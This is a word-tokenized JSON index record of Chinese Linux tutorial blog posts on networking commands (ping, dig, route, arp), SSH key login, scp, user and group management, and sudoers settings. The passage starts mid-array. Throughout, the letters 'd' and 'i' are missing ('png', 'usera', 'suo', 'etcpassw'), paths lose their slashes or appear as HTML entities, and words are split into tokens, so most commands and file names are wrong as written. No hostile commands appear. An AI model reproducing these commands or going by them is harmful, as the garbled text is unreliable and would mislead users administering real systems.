packets","transmtte",",","3","recee",",","0%","packet","loss",",","tme","2004","msrtt","mnagmaxme","=","35.02835.56636.4480.664","ms","首先","，","png","程序","会","向","域名","服务器","(","DNS",")","发送","请求","，","解析","域名","www",".","bau",".","com","的","IP","地址","。","DNS","返回","域名","的","一个","别名","www",".","a",".","shfen",".","com","以及","对应","的","IP","地址","61.135.169.121","。","之后","png","程序","开始","向","这个","地址","发送","请求","报文","，","每","1","s","发送","一个","，","png","收到","TCMP","回显","应答","并","将","结果","显示","在","终端","上","，","包括","ICMP","序列号","(","cmp","_","seq",")","，","生存","时间","(","ttl",")","和","数据包","往返","时间","(","tme",")","。","最后","，","给出","汇总","信息","，","包括","报文","总","收发","情况","，","总","时间","，","往返","时间","最小值","、","平均值","、","最大值","、","平均","偏差","(","越","大","说明","网络","越","不稳定",")","。","host","：","DNS","查询","host","这个","程序","是","bn","-","utls","包","里面","的","，","首先","yum","-","y","nstall","bn","-","utls","。","[","root@noe","~","]","#","host","ymlog",".","cnymlog",".","cn","has","aress","47.94.18.223","host","命令","通过","配置","文件","etcresol",".","conf","中指","定","的","DNS","服务器","查询","name","的","IP","地址","：","[","root@noe","~","]","#","cat","etcresol",".","conf","#","Generate","by","NetworkManagersearch","localomannameserer","192.168.19.2","g","：","DNS","查询","g","和","host","命令","的","语法","一致","，","但","提供","了","更","详细的","信息","和","更多","的","选项","：","g","www",".","bau",".","com","#","只","查询","域名","的","A","记录","并","以","短","格式","显示","：","g","www",".","bau",".","com","A","+","short","#","用","@","serer","的","方式","指定","DNS","服务器","：","g","+","noall","+","answer","www",".","bau",".","com","A","@","8.8.8.8","traceroute",",","tracepath","：","路由","跟踪","arp","：","显示","系统","的","arp","缓存","[","root@noe","~","]","#","arp","-","apromote",".","cache","-","ns",".","local","(","192.168.19.2",")","at","00",":","50",":","56",":","e","6",":","9","f",":","39","[","ether","]","on","ens","32","promote",".","cache","-","ns",".","local","(","192.168.19.1",")","at","00",":","50",":","56",":","c","0",":","00",":","08","[","ether","]","on","ens","32","promote",".","cache","-","ns",".","local","(","192.168.19.254",")","at","00",":","50",":","56",":","e","1",":","59",":","8","b","[","ether","]","on","ens","32","arpng","：","给","邻居","主机","发送","ARP","请求","如","发现","某地","址","不稳定","，","可以","使用","arpng","测试","该","地址","是否","为","MAC","地址","冲突","：","[","root@noe","~","]","#","arpng","192.168.19.2","-","I","ens","32","ARPING","192.168.19.2","from","192.168.19.132","ens","32","Uncast","reply","from","192.168.19.2","[","00",":","50",":","56",":","E","6",":","9","F",":","39","]","0.678","msUncast","reply","from","192.168.19.2","[","00",":","50",":","56",":","E","6",":","9","F",":","39","]","0.811","msUncast","reply","from","192.168.19.2","[","00",":","50",":","56",":","E","6",":","9","F",":","39","]","1.158","ms","route","：","显示","或","更改","路由","表","[","root@noe","~","]","#","routeKernel","IP","routng","tableDestnaton","Gateway","Genmask","Flags","Metrc","Ref","Use","Ifaceefault","promote",".","cache","-","0.0.0.0","UG","100","0","0","ens","32192.168.19.0","0.0.0.0","255.255.255.0","U","100","0","0","ens","32","其","中","Destnaton","表示","目的","网段","或","目标","主机",";","Gateway","表示","网关","地址",";","Genmask","表示","目的","网段","的","掩码",";","Flags","表示","路由","标志","：","U","表示","路由","是","启用","(","up",")","的","、","G","表示","网关",";","Metrc","表示","目标","距离","，","通常","用跳","数","表示",";","Ref","表示","路由","的","引用","数",";","Use","表示","路由","查找","计数",";","Iface","表示","此","条","路由","的","出口","。","选项","-","n","表示","用","数字","形式","显示","目的","网段","选项","a","和","el","表示","添加","或","删除","一条","路由","。","选项","-","net","和","netmask","表示","指定","目的","网段","及","掩码","。","选项","gw","表示","指定","网关","。","选项","e","IF","表示","指定","出口","网卡","如","增加","一条","到","192.56.76",".","x","的","路由","，","使","它","的","出口","为","ens","32","：","route","a","-","net","192.168.20.0","netmask","255.255.255.0","e","ens","32","如","增加","一条","默认","路由","，","指明","它","的","网关","为","10.0.1.1","route","a","efault","gw","10.0.1.1","如","增加","一条","到","172.20.70.0","的","路由","，","网关","为","10.0.1.2","route","a","-","net","172.20.70.024","gw","10.0.1.2","如","删除","默认","路由","route","el","efault","ssh","：","远程","登录","SSH","（","Secure","Shell","）","是","一种","能够","以","安全的","方式","提供","远程","登录","的","协议","，","也是","目前","远程","管理","Lnux","系统","的","首选","方式","。","在此之前","，","一般","使用","FTP","或","Telnet","来","进行","远程","登录","。","但是","因为","它们","以","明文","的","形式","在","网络","中","传输","账户","密码","和","数据","信息","，","因此","很不","安","全","，","很容易","受到","黑客","发起","的","中间人","攻击","，","这","轻","则","篡改","传输","的","数据","信息","，","重","则","直接","抓取","服务器","的","账户","密码","。","想要","使用","SSH","协议","来","远程","管理","Lnux","系统","，","则","需要","部署","配置","ssh","服务","程序","。","SSHD","服务","：","基于","口令","的","验证","—","用","账户","和","密码","来","验证","登录","；","基于","密钥","的","验证","—","需要","在","本地","生成","密钥","对","，","然后","把","密钥","对","中的","公钥","上传","至","服务器","，","并","与","服务器","中的","公钥","进行","比较","；","该","方式","相较","来说","更","安全","。","当","命令","ssh","后","直接","跟","主机","IP","时","表示","使用","默认","用户","root","登录","，","如果","是","首次","登录","，","需要","确认","添加","该","主机","的","认证","key","，","当","输入","yes","后","，","即","会","在","本","机","root",".","sshknown","_","hosts","中","增加","一条","该","主机","的","记录","，","下一次","登录","时","就","不用","再次","确认","了","。","然后","需要","输入","用户密码","，","通过","验证","之后","，","我们","就","获得","了","目的","主机","的","一个","shell","，","我们","就","可以","在","这个","shell","中","执行","命令","了","。","ssh","的","配置","文件","etcsshssh","_","confg","参数","作用","Port","22","默认","的","ssh","服务","端口","LstenAress","0.0.0.0","设定","ssh","服务","监听","的","IP","地址","Protocol","2","SSH","协议","版本号","HostKey","etcsshssh","_","host","_","key","SSH","协议","版本","为","1时","，","DES","私钥","存放","的","位置","HostKey","etcsshssh","_","host","_","rsa","_","key","SSH","协议","版本","为","2时","，","RSA","私钥","存放","的","位置","HostKey","etcsshssh","_","host","_","sa","_","key","SSH","协议","版本","为","2时","，","DSA","私钥","存放","的","位置","PermtRootLogn","yes","设定","是否","允许","root","管理员","直接","登录","StrctMoes","yes","当","远程","用户","的","私钥","改变","时","，","拒绝","连接","MaxAuthTres","6","最大","密码","尝试","次数","PassworAuthentcaton","yes","是否","允许","密码","验证","PermtEmptyPasswors","no","是否","允许","空","密码","登录","A","远程","登录","B","1","、","A","端","生成","公钥","和","私钥","[","root@noe","~","]","#","ssh","-","keygen","-","t","rsaGeneratng","publcprate","rsa","key","par",".","Enter","fle","n","whch","to","sae","the","key","(","root",".","ssh","_","rsa",")",":","#","回车","Create","rectory","'","root",".","ssh","'",".","Enter","passphrase","(","empty","for","no","passphrase",")",":","#","回车","Enter","same","passphrase","agan",":","#","回车","Your","entfcaton","has","been","sae","n","root",".","ssh","_","rsa",".","#","私钥","Your","publc","key","has","been","sae","n","root",".","ssh","_","rsa",".","pub",".","#","公钥","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","其中","命令","ssh","-","keygen","用来","生成","公钥私钥","，","选项","-","t","指明","密钥","类型","。","之后","使用","命令","ssh","-","copy","-","将","公钥","发送","至","目标","主机","，","这里","需要","输入","目标","主机","用户密码","。","然后","就","可","以免","密码","登录","了","：","2","、","将","公钥","复制","给","B","端","[","root@noe","~","]","#","ssh","-","copy","-","192.168.19.50","bnssh","-","copy","-",":","INFO",":","Source","of","key","(","s",")","to","be","nstalle",":","\"","root.ssh_rsa.pub\"-----------------root@192.168.19.50's","passwor",":","#","这里","需要","输入","一次","B","的","密码","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","3","、","远程","登陆","B","[","root@noe","~","]","#","ssh","-","p","22","192.168.19.50","选项","-","p","为","登录","指定","端口","端口","设置","在","服务端","配置文件","etcsshssh","_","confg","中","，","默认","端口","号","为","22","，","如","更改","需","将","#","Port","22","去掉","注释","并","将","22","更改","为","需要","的","端口","，","然后","重","启","ssh","服务","serce","ssh","restart","或","systemctl","restart","ssh","。","将","本地文件","的","root","文件","备份","至","远程","主机","tar","zc","root","ssh","192.168.19.50","\"","tar","xz","\"","ssh","user","@","host","\"","tar","cz","hometemp","\"","tar","xz","#","远程","temp","目录","备份","到","本地","scp","：","远程","传输","命令","-","1","：","强制","scp","命令","使用","协议","ssh","1","-","2","：","强制","scp","命令","使用","协议","ssh","2","-","4","：","强制","scp","命令","只","使用","IP","4","寻址","-","6","：","强制","scp","命令","只","使用","IP","6","寻址","-","B","：","使用","批处理","模式","（","传输","过程","中","不","询问","传输","口令","或","短语","）","-","C","：","允许","压缩","。","（","将","-","C","标志","传递","给","ssh","，","从而","打开","压缩","功能","）","-","p","：","保留","原文","件","的","修改","时间","，","访问","时间","和","访问","权限","。","-","q","：","不","显示","传输","进度","条","。","-","r","：","递归","复制","整个","目录","。","-","：","详细","方式","显示","输出","。","scp","和","ssh","(","1",")","会","显示","出","整个过程","的","调试","信息","。","这些","信息","用于","调试","连接","，","验证","和","配置","问题","。","-","c","cpher","：","以","cpher","将","数据传输","进行","加密","，","这个","选项","将","直接","传递","给","ssh","。","-","F","ssh","_","confg","：","指定","一个","替代","的","ssh","配置","文件","，","此","参数","直接","传递","给","ssh","。","-","entty","_","fle","：","从","指定","文件","中","读取","传输","时","使用","的","密钥","文件","，","此","参数","直接","传递","给","ssh","。","-","l","lmt","：","限定","用户","所","能","使用","的","带宽","，","以","Kbts","为","单位","。","-","o","ssh","_","opton","：","如果","习惯于","使用","ssh","_","confg","(","5",")","中的","参数","传递","方式","，","-","P","port","：","注意","是","大写","的","P",",","port","是","指定","数据传输","用到","的","端口","号","-","S","program","：","指定","加密","传输","时","所","使用","的","程序","。","此","程序","必须","能够","理解","ssh","(","1",")","的","选项","。","实例","1","、","从","本地","复制","到","远程","命令","格式","：","scp","local","_","fle","remote_username@remote_p",":","remote","_","foler","或者","scp","local","_","fle","remote_username@remote_p",":","remote","_","fle","或者","scp","local","_","fle","remote","_","p",":","remote","_","foler","或者","scp","local","_","fle","remote","_","p",":","remote","_","fle","第","1",",","2个","指定","了","用户","名","，","命令","执行","后","需要","再","输入","密码","，","第","1个","仅","指定","了","远程","的","目录","，","文件","名字","不变","，","第","2个","指定","了","文件名","；","第","3",",","4个","没有","指定","用户名","，","命令","执行","后","需要","输入","用户名","和","密码","，","第","3个","仅","指定","了","远程","的","目录","，","文件","名字","不变","，","第","4个","指定","了","文件名","；","应用","实例","：","scp","&","#","x","2","F",";","home","&","#","x","2","F",";","space","&","#","x","2","F",";","musc","&","#","x","2","F",";","1",".","mp","3","root@www.runoob.com",":","&","#","x","2","F",";","home","&","#","x","2","F",";","root","&","#","x","2","F",";","others","&","#","x","2","F",";","musc","scp","&","#","x","2","F",";","home","&","#","x","2","F",";","space","&","#","x","2","F",";","musc","&","#","x","2","F",";","1",".","mp","3","root@www.runoob.com",":","&","#","x","2","F",";","home","&","#","x","2","F",";","root","&","#","x","2","F",";","others","&","#","x","2","F",";","musc","&","#","x","2","F",";","001",".","mp","3","scp","&","#","x","2","F",";","home","&","#","x","2","F",";","space","&","#","x","2","F",";","musc","&","#","x","2","F",";","1",".","mp","3","www",".","runoob",".","com",":","&","#","x","2","F",";","home","&","#","x","2","F",";","root","&","#","x","2","F",";","others","&","#","x","2","F",";","musc","scp","&","#","x","2","F",";","home","&","#","x","2","F",";","space","&","#","x","2","F",";","musc","&","#","x","2","F",";","1",".","mp","3","www",".","runoob",".","com",":","&","#","x","2","F",";","home","&","#","x","2","F",";","root","&","#","x","2","F",";","others","&","#","x","2","F",";","musc","&","#","x","2","F",";","001",".","mp","3","复制","目录","命令","格式","：","scp","-","r","local","_","foler","remote_username@remote_p",":","remote","_","foler","或者","scp","-","r","local","_","foler","remote","_","p",":","remote","_","foler","第","1个","指定","了","用户","名","，","命令","执行","后","需要","再","输入","密码","；","第","2个","没有","指定","用户名","，","命令","执行","后","需要","输入","用户名","和","密码","；","应用","实例","：","scp","-","r","&","#","x","2","F",";","home","&","#","x","2","F",";","space","&","#","x","2","F",";","musc","&","#","x","2","F",";","root@www.runoob.com",":","&","#","x","2","F",";","home","&","#","x","2","F",";","root","&","#","x","2","F",";","others","&","#","x","2","F",";","scp","-","r","&","#","x","2","F",";","home","&","#","x","2","F",";","space","&","#","x","2","F",";","musc","&","#","x","2","F",";","www",".","runoob",".","com",":","&","#","x","2","F",";","home","&","#","x","2","F",";","root","&","#","x","2","F",";","others","&","#","x","2","F",";","上面","命令","将","本地","musc","目录","复制","到","远程","others","目录","下","。","2","、","从","远程","复制","到","本地","从","远程","复制","到","本地","，","只要","将","从","本地","复制","到","远程","的","命令","的","后","2个","参数","调换","顺序","即可","，","如下","实例","应用","实例","：","scp","root@www.runoob.com",":","homerootothersmusc","homespacemusc","1",".","mp","3","scp","-","r","www",".","runoob",".","com",":","homerootothers","homespacemusc","说明","1",".","如果","远程","服务器","防火墙","有为","scp","命令","设置","了","指定","的","端口","，","我们","需要","使用","-","P","参数","来","设置","命令","的","端口","号","，","命令","格式","如下","：","#","scp","命令","使用","端口","号","4588","scp","-","P","4588","remote@www.runoob.com",":","usrlocalsn",".","sh","homeamnstrator","2",".","使用","scp","命令","要","确保","使用","的","用户","具有","可读","取","远程","服务器","相应","文件","的","权限","，","否则","scp","命令","是","无法","起作用","的","。"],"url":"http://ymlog.cn/2020/01/19/%E7%B3%BB%E7%BB%9F%E5%92%8C%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4/","title":"系统和网络命令","content":"系统本章简单介绍一些Linux系统常用到的命令，包括修改系统相关设置（比如用户名、时间日期等），监视系统活动、Linux系统包管理以及环境变量等。\ntop：监视进程活动#第一行top - 18:50:07 up 98 days,  2...","author":"ZEN","categorie":{"url":"http://ymlog.cn/categories/Linux/","name":"Linux"},"date":"2020-01-19 21:53:54"},{"word":["常用","命令","类型","举例","用户","who",",","whoam",",","su",",","usera",",","userel",",","passw",",","usermo",",","etcpassw","组","groupa",",","groupel",",","groupmo",",","etcgroup","文件","chmo",",","chown",",","chgrp","其他","suo","、","ext","用户","和","组","用户","和","组","的","概念","在","Lnux","中","，","用户","分为","管理员","用户","和","普通用户","，","普通用户","又","分为","系统","用户","和","登录","用户","，","每一个","用户","都","有用","户名","和","独一无二","的","用户","。","管理员","的","用户","为","0","，","普通","用户","中","，","系统","用户","的","用户","为","1","~","499","，","登录","用户","的","用户","为","500","+","。","组","也","分为","管理员","组","和","普通","用户组","，","不过","又","可以","分为","基本","组","（","主组","）","和","附加","组","（","额外","组","）","。","基本","组","的","组","名","与","用户","名","相同","，","附加","组","是","为了","方便","管理","用户","，","一个","用户","可以","有","多","个","附加","组","。","Lnux","安全","上下文","：","运行","中的","程序","我们","称之为","进程","（","process","）","，","进程","能够","访问","其","所有","资源","的","权限","，","取决","于","进程","发起者","身份","。","相关","配置","文件","Lnux","中","与","用户","和","组","相关","的","配置","文件","目录","含义","etcpassw","用户","及其","属性","信息","（","名称","、","UID","、","基本","组","ID","等","）","etcgroup","组","及其","属性","信息","etcshaow","用户密码","及其","相关","属性","etcgshaow","组","密码","及其","相关","属性","为了","方便","管理","属于","同","一组","的","用户","，","Lnux","系统","中","还","引入","了","用户组","的","概念","。","通过","使用","用户组","号码","（","GID","，","Group","IDentfcaton","）","，","我们","可以","把","多","个","用户","加入","到","同一个","组","中","，","从而","方便","为","组","中的","用户","统一","规划","权限","或","指定","任务","。","另外","，","在","Lnux","系统","中","创建","每个","用户","时","，","将","自动","创建","一个","与其","同名","的","基本","用户组","，","而且","这个","基本","用户组","只有","该","用户","一个人","。","如果","该","用户","以后","被","归","纳入","其他","用户组","，","则","这个","其他","用户组","称之为","扩展","用户组","。","一个","用户","只","有","一个","基本","用户组","，","但是","可以","有","多","个","扩展","用户组","，","从而","满足","日常","的","工作","需要","。","1","、","etcpassw","&","#","x","2","F",";","etc","&","#","x","2","F",";","passw","存放","用户信息","，","由","6个","冒号","组成","7个","信息","1",".","用户名","2",".","密码","（","x","表示","加密","密码","）","3",".","UID","（","用户","标识","）","4",".","GID","（","组","标识","）","5",".","用户","全名","或","本地","账号","6",".","家","目录","7",".","登录","之后","使用","的","终端","命令","For","example",":","ngnx",":","x",":","997",":","993",":","Ngnx","web","serer",":","&","#","x","2","F",";","ar","&","#","x","2","F",";","lb","&","#","x","2","F",";","ngnx",":","&","#","x","2","F",";","sbn","&","#","x","2","F",";","nologn","1","2","3","4","5","6","7","2","、","etcgroup","用户组","的","所有","信息","都","存放","在","&","#","x","2","F",";","etc","&","#","x","2","F",";","group","文件","中","。","此","文件","的","格式","是","由","冒号","(",":",")","隔开","若干","个","字段","，","具体","如下","：","【","组","名","】",":","【","口令","】",":","【","组","标识","号","】",":","【","组","内","用户","列","表","】","组","名","：","是","用户组","的","名称","，","由","字母","或","数字","构成","，","不","应","重复","。","口令","：","存放","的","是","用户组","加密","后","的","口令","字","。","一般","Lnux","系统","的","用户组","都","没有","口令","，","即","这个","字段","一般","为","空","或者","*","。","组","标识","号","：","与","用户","标识","号","类似","，","也是","一个","整数","，","被","系统","内部","用来","标识","组","。","别称","GID",".","组","内","用户","列","表","：","是","属于","这个","组","的","所有","用户","的","列表","，","不同","用户","之间","用","逗号","(",",",")","分隔","。","如","：","root",":","x",":","0",":","3","、","etcshaowroot",":","$","6","$","DHbyICea",".","JS","60","r",".","c","0",":",":","0",":","99999",":","7",":",":",":","参数","一","：","用户","名称","参数","二","：","用户","加密","后","的","密码","参数","三","：","用户密码","最近","一次","修改","时间","，","算法","是","今天","的","时间","减去","jan","，","1","，","1970","得到","的","时间","间隔","参数","四","：","用户","最少","多少","天后","才能","改","密码","的","天数","（","默认","为","0","，","表示","可以","在任","何","时间","修改","）","参数","五","：","用户","最","多多","少","天后","一定要","修改","密码","的","天数","，","系统","会","强制","用户","修改","密码","（","默认","为","99999","，","改为","1","也","能","让","密码","改","不了","）","参数","六","：","过期","前","多少","天时","间","会","被","警告","（","改为","-","1","则","永远","不会","提示","）","参数","七","：","过期","后","多少","天","内","账号","变为","nacte","状态","，","可","登陆","，","但","不能","操作","参数","八","：","多少","天后","账号","会","过期","，","无法","登陆","参数","九","：","保留","参数","4","、","etcgshaow","&","#","x","2","F",";","etc","&","#","x","2","F",";","gshaow","格式","如下","，","每个","用户组","独占","一行","；","groupname",":","passwor",":","amn",",","amn",",","…",":","member",",","member",",","…","第一","字段","：","用户组","第","二","字段","：","用户组","密码","，","这个","段","可以","是","空的","或","!","，","如果","是","空的","或","有","!","，","表示","没有","密码","；","第三","字段","：","用户组","管理者","，","这个","字段","也","可","为","空","，","如果","有","多","个","用户组","管理者","，","用",",","号","分割","；","第四","字段","：","组成","员","，","如果","有","多","个","成员","，","用",",","号","分割","；","For","example",":","house","1",":","!",":",":","查看","当前","用户","一般","使用","who","命令","可以","查看","当前","用户","：","#","显示","当前","所有","已","登录","的","用户信息","（","包括","闲置","时间",",","用户","状态",",","各","列","标题","）","[","root@experence","~","]","#","who","-","uTHNAME","LINE","TIME","IDLE","PID","COMMENTroot","+","pts","0","2020","-","01","-","17","08",":","49",".","6883","(","192.168.19.1",")","root","+","pts","1","2020","-","01","-","17","10",":","36",".","7377","(","192.168.19.1",")","用户","操作","命令","用户","1","、","usera","增","可以","使用","usera","命令","创建","用户","账户","。","使用","该","命令","创建","用户","账户","时","，","默认","的","用户","家","目录","会","被","存放","在","home","目录","中","，","默认","的","Shell","解释","器","为","bnbash","，","而且","默认","会","创建","一个","与","该","用户","同名","的","基本","用户组","参数","作用","-","指定","用户","的","家","目录","（","默认","为","homeusername","）","-","e","账户","的","到期","时间","，","格式","为","YYYY","-","MM","-","DD","-","u","指定","该","用户","的","默认","UID","-","g","指定","一个","初始","的","用户","基本","组","（","必须","已","存","在","）","-","G","指定","一个","或","多","个","扩展","用户组","-","N","不","创建","与","用户","同名","的","基本","用户组","-","s","指定","该","用户","的","默认","Shell","解释","器","一旦","用户","的","解释","器","被","设置","为","-","s","nologn","，","则","代表","该","用户","不能","登录","到","系统","中",",","有","哪些","解释","器","可以","再","etcpassw","中","查看","，","详情","请","参见","Lnux","的","目录","结构","。","查看","当前","用户","的","属组","和","属主","[","root@DZQ","etc","]","#","rootu","&","#","x","3","D",";","0","(","root",")","g","&","#","x","3","D",";","0","(","root",")","groups","&","#","x","3","D",";","0","(","root",")","For","example",":","usera","-","homeuserx","-","g","ngnx","user","02","#","创建","一个","名为","user","02","的","用户","，","但是","家","文件","的","文件名","为","userx","，","且","属主","是","user","02","，","属组","是","ngnx","[","root@ngnxs","~","]","#","ll","-","homeuserxrwx","-","-","-","-","-","-","2","user","02","ngnx","62","Dec","20","00",":","11","homeuserx","2","、","userel","删","删除","用户","时",",","如果","用户","所属","组","是","创建","用户","时","自动","创建","的","和","用户","名称","同名","的","组",",","并且","该","组","内","没有","其他用户",",","则","该","组","也","会","被","删掉","。","参数",":","-","f","强制","删除","用户",",","即使","用户","当前","已","登录","-","r","删除","用户",",","同时","删除","用户","主目录","。","如果","不","加","r","，","则","在","home","目录","下","，","还","会","有","用户","目录","3","、","usermo","改","用户","的","信息","保","存在","etcpassw","文件","中","，","可以","直接","用","文本","编辑器","来","修改","其中","的","用户","参数","项目","，","也","可","以","用","usermo","命令","修改","已经","创建","的","用户信息","参数","作用","-","c","填写","用户","账户","的","备注","信息","-","-","m","参数","-","m","与","参数","-","连用","，","可","重新","指定","用户","的","家","目录","并","自动","把","旧的","数据","转移","过去","-","e","账户","的","到期","时间","，","格式","为","YYYY","-","MM","-","DD","-","g","变更","所属","用户组","-","G","变更","扩展","用户组","-","L","锁定","用户","禁止","其","登录","系统","-","U","解锁","用户","，","允许","其","登录","系统","-","s","变更","默认","终端","-","u","修改","用户","的","UID","4","、","passw","当","创建","完","用户","，","需要","给","用户","添加","密码","，","比如","：","usera","zq","passw","zq","-","-","-","输入","你","想要","的","密码","-","-","-","-","-","-","之后","以","用户","zq","的","身份","登录","-","-","-","su","-","zqpassw","-","-","-","输入","你","刚刚","用","root","身份","创建","的","密码","，","就","可以","修改","密码","了","-","-","-","-","-","-","之后","再次","登录","到","系统","中","，","就","可以","使用","：","-","-","-","-","-","-","ssh","zq@192.168.255.10------","密码","：","passw","-","-","-","组","1","、","groupa","语法","：","groupa","[","-","g","g","[","-","o","]","]","[","-","r","]","[","-","f","]","group","参数","说明","：","-","g","：","指定","新建","工作组","的","；","-","r","：","创建","系统","工作组","，","系统","工作组","的","组","ID","小于","500","；","-","K","：","覆盖","配置","文件","“","ectlogn",".","efs","”","；","-","o","：","允许","添加","组","ID","号","不","唯一","的","工作组","。","-","f",",","–","force",":","如果","指定","的","组","已经","存在","，","此","选项","将","失明","了","仅","以","成功","状态","退出","。","当","与","-","g","一起","使用","，","并且","指定","的","GID","_","MIN","已经","存","在","时","，","选择","另一个唯一","的","GID","（","即","-","g","关闭","）","。","实例","：","创建","一个","新的","组","，","并","添加","组","ID","。","＃","groupa","－","g","344","runoob","2","、","groupmo","语法","groupmo","[","-","g","群组","识别","码","-","o","]","[","-","n","新","群组","名称","]","[","群组","名称","]","参数","：","-","g","群组","识别","码","设置","欲","使用","的","群组","识别码","。","-","o","重复使用","群组","识别码","。","-","n","新","群组","名称","设置","欲","使用","的","群组","名称","。","实例","修改","组","名","[","root@runoob.com","~","]","#","groupa","lnuxso","[","root@runoob.com","~","]","#","tal","-","1","etcgroup","lnuxso",":","x",":","500",":","[","root@runoob.com","~","]","#","tal","-","1","etcgroup","lnuxso",":","x",":","500",":","[","root@runoob.com","~","]","#","groupmo","-","n","lnux","lnuxso","[","root@runoob.com","~","]","#","tal","-","1","etcgroup","lnux",":","x",":","500",":","3","、","groupel","语法","：","groupel","[","群组","名称","]","实例","：","删除","一个","群组","#","groupel","hnuser","4","、","gpassw","参数","作用","-","a","–","a","USER","添加","用户","到","组","-","–","elete","USER","移","除","组","中","用户","-","Q","–","root","CHROOT","_","DIR","更","改组","的","chroot","目录","-","r","–","elete","-","passwor","删除","组","密码","-","M","–","members","USER",",","…","批量","添加","用户","到","组","-","A","–","amnstrators","ADMIN",",","…","设置","组","管理员","执行","管理员权限","这里","把","执行","管理员权限","分为","三种","方式","，","分","别","是","：","直接","切换","管理员","账户","、","临时","使用","管理员权限","、","将","管理员权限","写入","到","配置文件","。","1","、","su","-","切换","用户","使用","su","命令","可以","切换","用户","，","在","没有","参数","的","情况","下调","用时","，","su","默认","以","root","的","身份","运行","一个","交互式","的","shell","。","对于","向后","兼容性","，","su","默认","不","改变","当前","目录","，","只","设置","环境变量","HOME","和","SHELL","(","如果","目标","不是","root","，","则","加上","USER","和","LOGNAME",")","。","这个","版本","的","su","使用","PAM","作为","认证","、","账户","和","会话","管理","。","在","其他","su","实验","中","发现","一些","配置","选项","（","例如","：","对","轮组","的","支","持","）","必须","通过","PAM","进行","配置","su","后面","加上","“","-","”","表示","完全","切换","到","新用户","，","即","把","环境变量","信息","也","变","更为","新用户","相应","信息","。","如果","没有","指明","用户名","，","则","切换","到","root","，","如","：","su","2","、","suo","-","临时","权限","suo","命令","用于","给","普通用户","提供","额外","的","权限","来","完成","原本","root","管理员","才能","完成","的","任务","，","格式","为","“","suo","[","参数","]","命令","名称","”","参数","作用","-","h","列出","帮助","信息","-","l","列出","当前","用户","可执行","的","命令","-","u","用户","名","或","UID","值","以","指定","的","用户","身份","执行","命令","-","k","清","空","密码","的","有效","时间","，","下次","执行","suo","时","需要","再次","进行","密码","验证","-","b","在","后台","执行","指定","的","命令","-","p","更改","询问","密码","的","提","3","、","修改","配置文件","配置文件","etcsuoers",",","只","有","root","管理员","才","可以","使用","suo","命令","编辑","suo","服务","配置","文件","。","suo","禁止","多","个","用户","同时","修改","配置","suoers","文件","。","进入","普通","用户","时","，","还是","需要","suo","才","可以","执行","相关","权限","。","第一步","：","m","etcsuoers","，","将","第","99","行","左右","的","位置","，","添加","想要","赋予","权限","的","用户","[","root@localhost","~","]","#","se","'","99",",","102","p","'","-","n","etcsuoers","#","#","Allow","root","to","run","any","commans","anywhere","root","ALL","=","(","ALL",")","ALLNIKI","ALL","=","(","ALL",")","ALL","#","#","Allows","members","of","the","'","sys","'","group","to","run","networkng",",","software",",","第二步","：","登录","普通用户","[","root@localhost","~","]","#","su","-","NIKILast","logn",":","Mon","Aug","12","01",":","26",":","04","EDT","2019","on","pts","0","第三部","：","suo","-","l","，","这里","填","的","密码","是","NIKI","用户","自己","的","密码","[","NIKI@localhost","~","]","$","suo","-","l","[","suo","]","passwor","for","NIKI",":","Sorry",",","try","agan",".","[","suo","]","passwor","for","NIKI",":","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","User","NIKI","may","run","the","followng","commans","on","localhost",":","(","ALL",")","ALL","第四步","：","显示","不用","suo","[","NIKI@localhost","~","]","$","ls","rootls",":","cannot","open","rectory","root",":","Permsson","ene","用","suo","[","NIKI@localhost","~","]","$","suo","ls","root","1",".","txt","e","em","emo","mou","nn",".","sh","rubbsh","scrpt",".","sh","test",".","py","w",".","sh","w",".","sh","~","但是","考虑到","生产","环境","中","不允许","某个","普通","用户","拥有","整个","系统","中","所有","命令","的","最高","执行","权","（","这","也不","符合","前文","提到","的","权限","赋予","原则","，","即","尽可能","少地","赋予","权限","）","，","因此","ALL","参数","(","第","99","行","）","就","有些","不合适","了","。","因此","只能","赋予","普通","用户","具体的","命令","以","满足","工作","需求","，","这","也","受到","了","必要的","权限","约束","。","如果","需要","让","某个","用户","只能","使用","root","管理员","的","身份","执行","指定","的","命令","，","切记","一定要","给出","该","命令","的","绝对路径","，","否则","系统","会","识别","不","出来","。","我们","可以","先","使用","wheres","命令","找出","命令","所","对应","的","保存","路径","，","然后","把","配置","文件","第","99","行","的","用户权限","参数","修改","成对","应","的","路径","即可","[","lnuxprobe@lnuxprobe","~","]","$","extlogout","[","root@lnuxprobe","~","]","#","wheres","catcat",":","usrbncat","usrsharemanman","1","cat",".","1",".","gz","usrsharemanman","1","pcat",".","1","p",".","gz","[","root@lnuxprobe","~","]","#","suo","96","#","#","97","#","#","Allow","root","to","run","any","commans","anywhere","98","root","ALL","=","(","ALL",")","ALL","99","lnuxprobe","ALL","=","(","ALL",")","usrbncat","此时","，","用户","只","能用","suo","执行","cat","命令","。","这样","虽然","赋予","了","普通用户","执行","管理员","命令","的","权限","，","但","每次","执行","之前","都","要","输入","密码","，","可以","通过","以下","配置","，","使得","用户","执行","suo","时","，","不用","密码","验证","。","[","root@lnuxprobe","~","]","#","suo","…","…","…","…","…","…","省略","部分","文件","内容","…","…","…","…","…","…","96","#","#","97","#","#","Allow","root","to","run","any","commans","anywhere","98","root","ALL","=","(","ALL",")","ALL","99","lnuxprobe","ALL","=","NOPASSWD",":","usrsbnpoweroff","文件","lnux","一切","皆","文件","，","但","文件类型","和","权限","有所不同","，","用字","符","来","区分","。","概述","文件类型","-","：","普通","文件","：","目录","文件","l","：","链接","文件","b","：","块","设备","文件","c","：","字符","设备","文件","p","：","管道","文件","文件","权限","r","w","x","读","写","执行","4","2","1","对于","文件","而言","r","w","x","可以","读","文件","的","内容","可以","编辑","文件","的","内容","可以","执行","这个","文件","对于","目录","而言","r","w","x","读","目录","中","的","文件属性","信息","可以","在","目录","中","添加","或","删除","文件","数据","信息","是否","可以","进入","到","目录","权限","详解","[","root@ngnxs","qanao","]","#","ll","total","8","-","rw","-","r","-","-","r","-","-","1","root","root","1424","Aug","15","06",":","05","Dockerfle","-","rw","-","r","-","-","r","-","-","1","root","root","1413","Aug","15","06",":","05","README",".","m","rwxr","-","xr","-","x","4","root","root","28","Aug","15","06",":","05","root","#","权限","数字","对应","权限","组","说明","：","总共